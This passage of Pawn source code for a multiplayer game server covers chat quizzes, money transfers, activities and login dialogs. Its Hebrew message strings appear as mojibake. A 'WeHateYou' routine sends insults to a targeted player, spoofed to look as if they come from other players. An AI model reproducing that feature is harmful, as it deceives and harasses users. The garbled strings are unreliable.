	    return AttachObjectToVehicle(playerinfo[playerid][vehicle][7], vehicleid, 0.000000,-0.300000,0.075000,8.099999,-0.000000,99.899971);
	}
    if(GetVehicleModel(vehicleid) == 509)
    {
	    playerinfo[playerid][vehicle][7] = CreateObject(1369,0,0,-1000,0,0,0,100+playerid);
	    return AttachObjectToVehicle(playerinfo[playerid][vehicle][7], vehicleid, 0.000000,-0.150000,0.075000,-2.700000,-8.100001,-180.899887);
	}
    if(GetVehicleModel(vehicleid) == 464)
    {
	    playerinfo[playerid][vehicle][7] = CreateObject(2512,0,0,-1000,0,0,0,100+playerid);
	    return AttachObjectToVehicle(playerinfo[playerid][vehicle][7], vehicleid,  0.000000,-0.300000,0.300000,-0.000000,-0.000001,-175.499893);
	}
    if(GetVehicleModel(vehicleid) == 411)
    {
	    playerinfo[playerid][vehicle][7] = CreateObject(11470,0,0,-1000,0,0,0,100+playerid);
	    return AttachObjectToVehicle(playerinfo[playerid][vehicle][7], vehicleid, 0.074999,0.000000,-0.899999,0.000000,0.000000,0.000000);
	}
 	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) if(!IsPlayerInAnyVehicle(i))
 	{
 	    if(playerinfo[i][vtele3] == 1) DestroyObject(playerinfo[i][vehicle][7]),playerinfo[i][vtele3] = 0;
	}
    return 1;
}
//=[Math]=======================================================================
public Math()
{
	if(debugstate) printf("Gamemode Activity [start]: Math");
	#if lagtest
		LagTest_Start("Math");
	#endif
	new string[M_S];
	maths[2] = random(2);
	switch(maths[2])
	{
		case 0: maths[2] = '+';
		case 1: maths[2] = '*';
	}
	maths[0] = randomEx(1,maths[2] == '*' ? 50 : 1000), maths[1] = randomEx(1,maths[2] == '*' ? 50 : 1000);
	switch(maths[2])
	{
		case '+': maths[3] = maths[0] + maths[1];
		case '*': maths[3] = maths[0] * maths[1];
	}
	maths[4] = 0;
	SendClientMessageToAll(0xFAEAA9FF,"Х Х Х Х Х [ " @c(lightyellow) "ЇЄщьх· Ў'рш" @h(FAEAA9) " ] Х Х Х Х Х");
	SendClientMessageToAll(lightblue," :∙рь· ю·юшщўф Ёщ·Ё· Єы∙щх");
	format(string,sizeof(string)," %d %c %d = ?",maths[0],maths[2],maths[1]);
	SendClientMessageToAll(white,string);
	SendClientMessageToAll(green," /math [answer] :щхуЄщэ р· ф·∙хсф? ∙ьчх рх·ф срюЎЄх· фЇўхуф");
	SendClientMessageToAll(orange," Х ф°р∙хя ∙щЇ·х° р· ф·°тщь щцыф сёыхэ ыёЇщ ьЇщ °ю· фўх∙щ ∙ь ф·°тщь");
	SendClientMessageToAll(0xFAEAA9FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	CActID = 1;
	chatacttimer = SetTimer("Math2",30000,0);
	#if lagtest
		LagTest_End("Math");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: Math");
	return 1;
}
//=[Math2]======================================================================
public Math2()
{
	if(debugstate) printf("Gamemode Activity [start]: Math2");
	#if lagtest
		LagTest_Start("Math2");
	#endif
	new string[M_S];
	if(maths[5] == -1 || !IsPlayerConnected(maths[5]))
	{
		format(string,sizeof(string)," .рє рчу ьр ЄЁф Ёыхя Єь ·°тщь фю·юшщўф! ф·∙хсф фщщ·ф %d",maths[3]);
		SendClientMessageToAll(red,string);
	}
	else
	{
		new pay = 0;
		switch(maths[2])
		{
			case '+': pay = 25;
			case '*': pay = 65;
		}
		pay += (maths[0] % 5 * maths[0] > (maths[2] == '*' ? 25 : 500) ? 5 : 1) + (maths[1] % 5 * (maths[2] == '*' ? 25 : 500) ? 5 : 1);
		SendClientMessage(maths[5],green," !ф·∙хсф ∙ьъ ЁыхЁф");
		format(string,sizeof(string)," !цыф сЇЄщьх· фю·юшщўф хўщсь %d$ %s",pay,GetName(maths[5]));
		SendClientMessageToAll(green,string);
		format(string,sizeof(string)," .фЇ·°хя фщф %d",maths[3]);
		SendClientMessageToAll(green,string);
		GiveMoney(maths[5],pay, 11);
		act_SaveWin(maths[5],act_Code(aid_chat,1));
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][pmath] == maths[3] && maths[5] != i) SendClientMessage(i,red," .р·ф рхюЁэ тэ ∙ьч· р· ф·∙хсф фЁыхЁф, ръ фюЁЎч фўущэ рх·ъ");
	}
	for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i)) playerinfo[i][pmath] = -1, playerinfo[i][actbonus] = false;
	maths[0] = -1, maths[1] = -1, maths[2] = -1, maths[3] = -1, maths[4] = 1, maths[5] = -1, CActID = -1;
	#if lagtest
		LagTest_End("Math2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: Math2");
	return 1;
}
//=[Trivia]=====================================================================
public Trivia()
{
	if(debugstate) printf("Gamemode Activity [start]: Trivia");
	#if lagtest
		LagTest_Start("Trivia");
	#endif
	new string[M_S], q = random(triviaQuestionsCount), qPos = 0, msgPos[3] = 0;
	SendClientMessageToAll(0xFAEAA9FF,"Х Х Х Х Х [ " @c(lightyellow) "ЇЄщьх· Ў'рш" @h(FAEAA9) " ] Х Х Х Х Х");
	SendClientMessageToAll(lightblue," :∙рь· ш°щххщф Ёщ·Ё· Єы∙щх");
	SendClientMessageToAll(white,triviaQuestions[q][tQuestion]);
	qPos = randomEx(1,4), trivia[0] = qPos, msgPos[0] = qPos;
	while(qPos == trivia[0]) qPos = randomEx(1,4);
	msgPos[1] = qPos;
	new moreqpos = randomEx(1,4);
	while(moreqpos == trivia[0] || moreqpos == qPos) moreqpos = randomEx(1,4);
	qPos = moreqpos, msgPos[2] = qPos;
	for(new i=1;i<4;i++)
	{
		if(msgPos[0] == i) format(string,sizeof(string)," %d. %s",msgPos[0],triviaQuestions[q][tAnswer1]);
		if(msgPos[1] == i) format(string,sizeof(string)," %d. %s",msgPos[1],triviaQuestions[q][tAnswer2]);
		if(msgPos[2] == i) format(string,sizeof(string)," %d. %s",msgPos[2],triviaQuestions[q][tAnswer3]);
		SendClientMessageToAll(green,string);
	}
	SendClientMessageToAll(green," /trivia [answer number] :щхуЄщэ р· ф·∙хсф? ∙ьчх рх·ф срюЎЄх· фЇўхуф");
	format(string,sizeof(string)," Х ф°р∙хя ∙щщуЄ р· ф·∙хсф фЁыхЁф ь∙рьф щщцыф с-%d$",trivia[2] = (25 * randomEx(1,7)));
	SendClientMessageToAll(orange,string);
	SendClientMessageToAll(orange," Х /bonus :°хЎф ьфтущь р· ёщыхщщъ ьцых·? сч° схЁхё");
	SendClientMessageToAll(0xFAEAA9FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	chatacttimer = SetTimer("Trivia2",30000,0);
	CActID = 2;
	#if lagtest
		LagTest_End("Trivia");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: Trivia");
	return 1;
}
//=[Trivia2]====================================================================
public Trivia2()
{
	if(debugstate) printf("Gamemode Activity [start]: Trivia2");
	#if lagtest
		LagTest_Start("Trivia2");
	#endif
	if(trivia[1] == -1 || !IsPlayerConnected(trivia[1])) SendClientMessageToAll(red," !рє рчу ьр ЄЁф Ёыхя Єь ∙рь· фш°щххщф");
	else
	{
		new string[M_S];
		SendClientMessage(trivia[1],green," !ф·∙хсф ь∙рь· фш°щххщф ∙∙ьч· ЁыхЁф");
		format(string,sizeof(string)," !ЄЁф Ёыхя Єь ∙рь· фш°щхщф хўщсь %d$ %s",trivia[2],GetName(trivia[1]));
		SendClientMessageToAll(green,string);
        GiveMoney(trivia[1],headserver != trivia[1] ? 1000 : 1000*2);
		act_SaveWin(trivia[1],act_Code(aid_chat,2));
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][ptrivia] == trivia[0] && trivia[1] != i) SendClientMessage(i,red," .р·ф рхюЁэ тэ ∙ьч· р· ф·∙хсф фЁыхЁф, ръ фюЁЎч фўущэ рх·ъ");
	}
	trivia = {-1,-1,0}, CActID = -1;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) playerinfo[i][ptrivia] = -1, playerinfo[i][actbonus] = false;
	#if lagtest
		LagTest_End("Trivia2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: Trivia2");
	return 1;
}
//=[CanP]=======================================================================
public CanP(playerid)
{
	playerinfo[playerid][canp] = 1;
	return 1;
}
//=[PayTimer]===================================================================
public PayTimer(playerid,id,amount,type)
{
	assert IsPlayerConnected(playerid) && IsPlayerConnected(id);
	new string[M_S];
	switch(type)
	{
		case 0:
		{
			if(amount > GetMoney(playerid))
			{
				format(string,sizeof(string)," .схшьф ыщ рщя ьъ щх·° р· фыёє %s фЄс°· ёыхэ фыёє $%d рь",GetName(id),amount);
				SendClientMessage(playerid,red,string);
				format(string,sizeof(string)," .схшьф ыщ рщя ьх р· фыёє щх·° %s фЄс°· ёыхэ фыёє $%d рьщъ Єь щущ фю∙·ю∙",GetName(playerid),amount);
				SendClientMessage(id,red,string);
			}
			else if(playerinfo[id][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none)
			{
				format(string,sizeof(string)," .схшьф ыщ фхр ЁыЁё ьрцх° ущ-рэ %s фЄс°· ёыхэ фыёє $%d рь",GetName(id),amount);
				SendClientMessage(playerid,red,string);
				format(string,sizeof(string)," .схшьф ыщ ЁыЁё· ьрцх° ущ-рэ %s фЄс°· ёыхэ фыёє $%d рьщъ Єь щущ фю∙·ю∙",GetName(playerid),amount);
				SendClientMessage(id,red,string);
			}
			else
			{
				GiveMoney(playerid,0-amount);
				GiveMoney(id,amount);
				SendClientMessage(playerid,yellow," .∙ьщч· фыёє фх∙ьюф");
				SendClientMessage(id,yellow," .∙ьщч· фыёє фх∙ьюф");
			}
		}
		case 1:
		{
			assert ((IsPlayerMAdmin(playerid) && playerinfo[playerid][admin] >= 10) || PlayerHasRank(playerid,RankID("ф°∙рх· юхтс°х·")));
			format(string,sizeof(string)," .%s ∙ьч· %d$ ь",GetName(id),amount);
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .ўщсь· юфрующя %d$",amount);
			SendClientMessage(id,green,string);
			format(string,sizeof(string),"via /gm: money sent (%d)%s [%d$]",id,GetName(id),amount);
			Log("Attention",playerid,string);
			GiveMoney(id,amount);
		}
	}
	playerinfo[playerid][paytimer] = {0,INVALID_PLAYER_ID,-1};
	return 1;
}
//=[FireworksLine]==============================================================
public FireworksLine(Float:x,Float:y,Float:z,count)
{
	CreateFirework(fireworkLine % 2 == 0 ? 3666 : 354,x + (10.0 * fireworkLine),y,z,90.0,30.0);
	fireworkLine++;
	if(fireworkLine >= count)
	{
		KillTimer(fireworkTimer);
		useFireworks = 1;
	}
	return 1;
}
//=[FireworksMatar]=============================================================
public FireworksMatar(Float:x,Float:y,Float:z,count)
{
	CreateFirework(!random(2) ? 3666 : 354,x + floatrand(10.0,40.0),y + floatrand(10.0,40.0),z,floatrand(60.0,120.0),30.0);
	fireworkLine++;
	if(fireworkLine >= count)
	{
		KillTimer(fireworkTimer);
		useFireworks = 1;
	}
	return 1;
}
//=[allowSICommand]=============================================================
public allowSICommand() siUsed = 0;
//=[allowCCCommand]=============================================================
public allowCCCommand() ccUsed = 0;
//=[allowauctionCommand]========================================================
public allowauctionCommand() auctionused = 0;
//=[VIPSuicide]=================================================================
public VIPSuicide(playerid)
{
	#if lagtest
		LagTest_Start("VIPSuicide");
	#endif
	new Float:p[3], vw = GetPlayerVirtualWorld(playerid);
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][vip] > 0 && GetDistanceBetweenPlayers(playerid,i) <= 70.0)
	{
		SetPlayerHealth(i,100000.0);
		SetPlayerArmour(i,100.0);
	}
	CreateExplosionVW(p[0]+(5.0*float(playerinfo[playerid][vsuicide][0])),p[1],p[2],1,0.3,vw);
	CreateExplosionVW(p[0]+(10.0*float(playerinfo[playerid][vsuicide][0])),p[1],p[2],1,0.3,vw);
	CreateExplosionVW(p[0],p[1]+(5.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3,vw);
	CreateExplosionVW(p[0],p[1]+(10.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3,vw);
	CreateExplosionVW(p[0]+(5.0*float(playerinfo[playerid][vsuicide][0])),p[1]+(10.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3,vw);
	CreateExplosionVW(p[0]+(10.0*float(playerinfo[playerid][vsuicide][0])),p[1]+(5.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3,vw);
	CreateExplosionVW(p[0]-(5.0*float(playerinfo[playerid][vsuicide][0])),p[1],p[2],1,0.3,vw);
	CreateExplosionVW(p[0]-(10.0*float(playerinfo[playerid][vsuicide][0])),p[1],p[2],1,0.3,vw);
	CreateExplosionVW(p[0],p[1]-(5.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3,vw);
	CreateExplosionVW(p[0],p[1]-(10.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3,vw);
	CreateExplosionVW(p[0]-(5.0*float(playerinfo[playerid][vsuicide][0])),p[1]-(10.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3,vw);
	CreateExplosionVW(p[0]-(10.0*float(playerinfo[playerid][vsuicide][0])),p[1]-(5.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3,vw);
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][vip] > 0 && GetDistanceBetweenPlayers(playerid,i) <= 70.0)
	{
		SetPlayerHealth(i,100.0);
		SetPlayerArmour(i,100.0);
	}
	playerinfo[playerid][vsuicide][0]++;
	if(playerinfo[playerid][vsuicide][0] >= 8)
	{
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][vip] > 0 && GetDistanceBetweenPlayers(playerid,i) <= 70.0)
		{
			SetPlayerHealth(i,100.0);
			SetPlayerArmour(i,100.0);
		}
		SetPlayerHealth(playerid,0.0);
		KillTimer(playerinfo[playerid][vsuicide][1]);
		playerinfo[playerid][vsuicide] = {0,-1};
	}
	#if lagtest
		LagTest_End("VIPSuicide");
	#endif
	return 1;
}
//=[Reporting]==================================================================
public Reporting(id)
{
	reporting[id] = 0;
	return 1;
}
//=[WeHateYou]==================================================================
public WeHateYou(playerid)
{
	if(playerinfo[playerid][wehateyou] == -1) return 0;
	new justhate[][32] =
	{
		"We Hate You",
		"We Hate You!",
		"We Hate You!!",
		"We Hate You!!!",
		"We hate you!",
		"We hate you!!!",
		"GO AWAY!",
		"NOOB!",
		"IDIOT!",
		"ASSHOLE!",
		" рщущхш",
		" рщущхш!",
		" Єхє юЇф",
		" Ўр юф∙°· ыс°",
		" ∙хЁрщэ рх·ъ!!!",
		" ьъ юыряяяяяя",
		" ьр °хЎщэ рх·ъ Їф!",
		" ё·ьў юЇф",
		" Єхє юыря",
		" ьъъъъ",
		"we hate yo!",
		"HATE U :)",
		">:-D",
		" !!Ўр юфё°с°",
		" !!Ўр юф∙°·",
		" 1!!!!!!ьъ юЇф"
	};
	SendPlayerMessageToPlayer(playerid,GetRandomPlayer(),justhate[random(sizeof(justhate))]);
	return 1;
}
//=[StartKickstar]==============================================================
public StartKickstar()
{
	if(debugstate) printf("Gamemode Activity [start]: StartKickstar");
	#if lagtest
		LagTest_Start("StartKickstar");
	#endif
	if(thereIsAct) return 0;
	kickstarinfo[0] = 1, kickstarinfo[1] = 0, kickstarinfo[2] = 60, kickstarinfo[3] = SetTimer("StartKickstar2",1000,1);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	SendClientMessageToAll(green," !··чщь сЄху уўф Kickstar-ЇЄщьх· ф");
	SendClientMessageToAll(green," /join рх /kickstar join ьфЎш°Їх· °∙юх р· фЇўхуф");
	SendClientMessageToAll(yellow," * .Єхьф " #join_act "$ хфЇ°ё ∙щчхьў сщя ыь фцхыщэ фхр " #actprize_kickstar "$ Kickstar-фЎш°Їх· ь·ч°х· ф");
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	GameTextForAll("~r~~h~kickstar~n~/join",6000,1);
	activityHighScores = TextDrawCreate(37.000000,246.000000,"\t~b~~h~~h~Kickstar:~w~~n~~n~1.\t-~n~2.\t-~n~3.\t-");
	TextDrawBackgroundColor(activityHighScores,255);
	TextDrawFont(activityHighScores,1);
	TextDrawLetterSize(activityHighScores,0.500000,1.700000);
	TextDrawColor(activityHighScores,-1);
	TextDrawSetOutline(activityHighScores,0);
	TextDrawSetProportional(activityHighScores,1);
	TextDrawSetShadow(activityHighScores,1);
	thereIsAct = true;
	#if lagtest
		LagTest_End("StartKickstar");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartKickstar");
	return 1;
}
//=[StartKickstar2]==============================================================
public StartKickstar2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartKickstar2");
	#if lagtest
		LagTest_Start("StartKickstar2");
	#endif
	new string[M_S];
	kickstarinfo[2]--;
	if(kickstarinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(kickstarinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~r~~h~Kickstar: ~h~%d~n~~r~~h~(%d/%d)",kickstarinfo[2],kickstarinfo[1],MAX_ACTIVITY_PLAYERS);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(kickstarinfo[2] == 15 || kickstarinfo[2] == 30)
		{
			format(string,sizeof(string)," /join :··чщь сЄху %d ∙Ёщх·, ьфЎш°Їх· Kickstar ·ч°х· ф",kickstarinfo[2]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(kickstarinfo[2] == 3)
	{
		if(kickstarinfo[1] < 2) return EndKickstar("юёЇ° ф∙чўЁщэ ∙фЎш°Їх ўшя ю2",-1);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitkickstar])
			{
				if(GetPlayerState(i) != PLAYER_STATE_DRIVER || (GetVehicleType(GetPlayerVehicleID(i)) != 0 && GetVehicleType(GetPlayerVehicleID(i)) != 1))
				{
					SendClientMessage(i,red,GetPlayerState(i) != PLAYER_STATE_DRIVER ? (" .юыщххя ∙ьр фщщ· Ёфт с°ыс Kickstar ьр ∙хт°· ь·ч°х· ф") : (" .Kickstar ьр ∙хт°· ь·ч°х· юыщххя ∙ьр Ёщ·я ьф∙·ю∙ с°ыс ∙ьъ с"));
					kickstarinfo[1]--;
					playerinfo[i][waitkickstar] = 0;
					continue;
				}
				SetFreeze(i,1);
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				ResetWeapons(i);
				SetPlayerVirtualWorld(i,world_kickstar);
				SetVehicleVirtualWorld(GetPlayerVehicleID(i),world_kickstar);
				SetPlayerInterior(i,0);
				LinkVehicleToInterior(GetPlayerVehicleID(i),0);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][0]) command(i,"/pet off");
				SetPlayerTeam(i,NO_TEAM);
				SetCameraBehindPlayer(i);
				SetVehicleHealth(GetPlayerVehicleID(i),1000.0);
				SetVehiclePos(GetPlayerVehicleID(i),Kickstar[playerinfo[i][kickstarid]][0],Kickstar[playerinfo[i][kickstarid]][1],Kickstar[playerinfo[i][kickstarid]][2],i);
				SetVehicleZAngle(GetPlayerVehicleID(i),Kickstar[playerinfo[i][kickstarid]][3]);
				ResetWeapons(i);
				SendClientMessage(i,orange," !KickstarсфЎьчф с·ч°х· ф");
				TextDrawShowForPlayer(i,activityHighScores);
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(kickstarinfo[2] == 0)
	{
		new rnd = -1, tests = 0;
		do
		{
			if(tests == 10) break;
			rnd = random(sizeof(Kickstar)), tests++;
		}
		while rnd < 0 || rnd > sizeof(Kickstar)-1 || IsSomeoneNearKSPos(rnd);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitkickstar])
			{
				playerinfo[i][inkickstar] = 1, playerinfo[i][waitkickstar] = 0, playerinfo[i][kickstarprize] = 0, playerinfo[i][kickstarbonus] = 0;
				SetFreeze(i,0);
				DisablePlayerCheckpoint(i);
				SetPlayerCheckpoint(i,Kickstar[rnd][0],Kickstar[rnd][1],Kickstar[rnd][2],4.5);
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," ф·чщьф! юёЇ° фю∙··Їщэ: %d Kickstar-·ч°х· ф",kickstarinfo[1]);
		SendClientMessageToAll(green,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(kickstarinfo[3]);
		kickstarinfo[3] = SetTimer("WinKickstar",1000,1), kickstarinfo[4] = 90;
	}
	#if lagtest
		LagTest_End("StartKickstar2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartKickstar2");
	return 1;
}
//=[WinKickstar]================================================================
public WinKickstar()
{
	if(debugstate) printf("Gamemode Activity [start]: WinKickstar");
	#if lagtest
		LagTest_Start("WinKickstar");
	#endif
	new string[M_S];
	kickstarinfo[4]--;
	if(!kickstarinfo[4])
	{
		new winner[MAX_PLAYERS] = {-1,...}, winners = 0, highScore = 0;
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inkickstar] && playerinfo[i][kickstarscore] > highScore) highScore = playerinfo[i][kickstarscore];
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inkickstar] && playerinfo[i][kickstarscore] == highScore) winner[winners] = i, winners++;
		switch(winners)
		{
			case 0: SendClientMessageToAll(yellow," !Kickstar-рщя юЁЎчщэ с·ч°х· ф");
			case 1:
			{
				format(string,sizeof(string),"%s ~n~~w~is the winner in the ~r~~h~kickstar~w~!",GetName(winner[0]));
				MovingText(string,mt_activity,GetPlayerColor(winner[0]));
				format(string,sizeof(string)," !Kickstar-ЁщЎч с·ч°х· ф %s",GetName(winner[0]));
				SendClientMessageToAll(yellow,string);
			}
			default:
			{
				format(string,sizeof(string)," :фэ Kickstar-фюЁЎчщэ с·ч°х· ф %d",winners);
				SendClientMessageToAll(yellow,string);
				string = "";
				for(new i = 0; i < winners; i++) format(string,sizeof(string),"%s Х %s",string,GetName(winner[i]));
				strdel(string,0,2);
				SendClientMessageToAll(yellow,string);
				format(string,sizeof(string)," .ыь фюЁЎчщэ цых сёыхэ фыёЇщ " #actprize_kickstar "$ ∙ф·чьў ьюёЇ° фюЁЎчщэ, хфёыхэ ∙щщЎр - %d$",actprize_kickstar/winners);
				SendClientMessageToAll(yellow,string);
			}
		}
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inkickstar])
		{
			LinkVehicleToInterior(GetPlayerVehicleID(i),0);
			SetVehicleVirtualWorld(GetPlayerVehicleID(i),0);
			SetVehicleToRespawn(GetPlayerVehicleID(i));
			SpawnPlayer(i);
			format(string,sizeof(string),"~r~~h~kickstar: ~h~%d",playerinfo[i][kickstarscore]);
			GameTextForPlayer(i,string,4000,1);
			format(string,sizeof(string)," %d :Ёўхух· ∙ф°ххч· ёъ фыь",playerinfo[i][kickstarscore]);
			SendClientMessage(i,lightred,string);
			if(playerinfo[i][kickstarprize]) playerinfo[i][speedup][0] = 0.0, playerinfo[i][speedup][1] = 0.0, playerinfo[i][speedup][2] = 0.0, playerinfo[i][abf][0] = 0, playerinfo[i][abf][1] = INVALID_VEHICLE_ID;
			playerinfo[i][inkickstar] = 0, playerinfo[i][waitkickstar] = 0, playerinfo[i][kickstarid] = -1, playerinfo[i][kickstarscore] = 0, playerinfo[i][kickstarprize] = 0, playerinfo[i][kickstarbonus] = 0;
			playerinfo[i][inact] = 0;
			DisablePlayerCheckpoint(i);
		}
		for(new i = 0; i < winners; i++) if(winner[i] > -1)
		{
			GiveMoney(winner[i],actprize_kickstar / winners, 10);
			act_SaveWin(winner[i],act_Code(aid_kickstar));
		}
		TextDrawHideForAll(activityHighScores);
		TextDrawDestroy(activityHighScores);
		activityHighScores = INVALID_TEXT_DRAW;
		kickstarinfo[0] = 0, kickstarinfo[1] = 0, kickstarinfo[2] = 0, kickstarinfo[4] = 0;
		thereIsAct = false;
		KillTimer(kickstarinfo[3]);
	}
	new kickstarScoreShow[] = {30,60,10}, bool:show = false;
	for(new t = 0; t < sizeof(kickstarScoreShow) && !show; t++) if(kickstarinfo[4] == kickstarScoreShow[t]) show = true;
	if(show)
	{
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][inkickstar])
		{
			SendClientMessage(i,lightblue," ~ :Єуыхя - Kickstar ~");
			for(new a = 0; a < MAX_PLAYERS_; a++) if(IsPlayerConnected(a) && playerinfo[a][inkickstar])
			{
				format(string,sizeof(string)," Х %s - %d",GetName(a),playerinfo[a][kickstarscore]);
				SendClientMessage(i,yellow,string);
			}
			format(string,sizeof(string)," Х фцюя ∙Ёх·° Єу ёщхэ фЇЄщьх·: %d ∙Ёщх·",kickstarinfo[4]);
			SendClientMessage(i,orange,string);
		}
	}
	#if lagtest
		LagTest_End("WinKickstar");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: WinKickstar");
	return 1;
}// here
//=[PropertyDeleting]===========================================================
public PropertyDeleting(propname[])
{
	if(!PropertyExists_INT(propname)) return 0;
	if(strfind(propname,"rcon_login_") != -1)
	{
		new unban[64];
		format(unban,sizeof(unban),"unbanip %s",propname[strlen("rcon_login_")]);
		SendRconCommand(unban);
	}
	return RemoveProperty_INT(propname);
}
//=[OnDialogResponse]===========================================================
public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	if(playerinfo[playerid][indialog] != dialogid) return 1;
	playerinfo[playerid][indialog] = -1;
	#if lagtest
		LagTest_Start("OnDialogResponse");
	#endif
	new string[256], done = 0;
	for(new i = 0, j = strlen(inputtext); i < j; i++)
	{
		if(inputtext[i] == '%') inputtext[i] = '#', done++;
		if(inputtext[i] == '{') inputtext[i] = '(';
		if(inputtext[i] == '}') inputtext[i] = ')';
	}
	if(done > 0) SendClientMessage(playerid,red," ." @c(white) "#" @c(red) " сшўёш ∙°∙ю· юхЇщЄ рчхц: юыщххя ∙ф∙°· ьр юёхть ьўсь р· ф·х фцф, ыь фрчхцщэ фхчьЇх с");
	if(!IsPlayerMAdmin(playerid) && ++playerinfo[playerid][dialogresp] >= 6)
	{
		SendClientMessage(playerid,red," .р·ф ьхчї Єь ыЇ·х°щэ с·Ї°щш юф° юущ... рЁр фЄц° сёсьЁх·");
		new capt[64], info[1024], b1[32], b2[32];
		GetPVarString(playerid,"dialog_caption",capt,sizeof(capt));
		GetPVarString(playerid,"dialog_info",info,sizeof(info));
		GetPVarString(playerid,"dialog_b1",b1,sizeof(b1));
		GetPVarString(playerid,"dialog_b2",b2,sizeof(b2));
		ShowPlayerDialog(playerid,GetPVarInt(playerid,"dialog_id"),GetPVarInt(playerid,"dialog_style"),capt,info,b1,b2);
		return 1;
	}
	if(FoundCrashingChar(inputtext))
	{
		new ds = GetPVarInt(playerid,"dialog_style");
		if(ds == DIALOG_STYLE_LIST || ds == DIALOG_STYLE_TABLIST || ds == DIALOG_STYLE_TABLIST_HEADERS)
		{
			SendClientMessage(playerid,red," .чьў юф·хщэ чёхющэ с∙°·");
			return 0;
		}
	}
	format(string,sizeof(string),"%d %d %d %s",dialogid,response,listitem,inputtext);
	Log("Commands",playerid,string);
	string = "";
	PlaySound(playerid,response ? 0 : 0);
	switch(dialogid)
	{
		case dialog_login:
		{
			if(response)
			{
				string = "";
				if(PropertyExists_STR(propformat_RPass(playerid))) format(string,sizeof(string),GetProperty_STR(propformat_RPass(playerid)));
				if(equal(Encrypt(inputtext),fgetstring(fuser(playerid),"Password")) || (strlen(string) > 0 && equal(inputtext,string)))
				{
					SendClientMessage(playerid,lightblue," !ф·чс°· сфЎьчф ью∙·ю∙ ∙ьъ");
					if(PropertyExists_STR(propformat_RPass(playerid)))
					{
						RemoveProperty_STR(propformat_RPass(playerid));
						SendClientMessage(playerid,lightblue," /changepass :юыщххя ∙ф∙·ю∙· сўху ь∙чцх° фёщёюр, рЁчЁх ююьщЎщэ юрху ∙·сч° ёщёюр чу∙ф ыЄ·");
					}
					LoginPlayer(playerid);
					playerinfo[playerid][iplogin] = 0;
					if(!playerinfo[playerid][adminone]) ShowEnterDialog(playerid);
					playerinfo[playerid][logged] = 1;
					PlaySound(playerid,1057);
				}
				else
				{
					format(string,sizeof(string),"%s%s.ini",folder_users,GetName(playerid));
